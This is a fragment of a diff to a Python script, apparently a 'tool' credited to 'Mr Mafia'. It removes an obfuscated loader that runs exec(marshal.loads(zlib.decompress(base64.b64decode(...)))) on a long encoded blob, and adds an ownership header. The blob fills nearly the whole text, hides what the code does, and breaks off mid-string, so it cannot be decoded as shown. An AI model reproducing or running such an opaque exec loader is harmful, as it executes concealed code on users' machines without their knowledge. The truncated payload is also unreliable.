@@ -1,5 +1,684 @@
-# Compiled By Mr Mafia | Muhammad Muzammil
-# Github :  https://github.com/Muzammil-404
+#SC OWNER_______________HUNTER
 
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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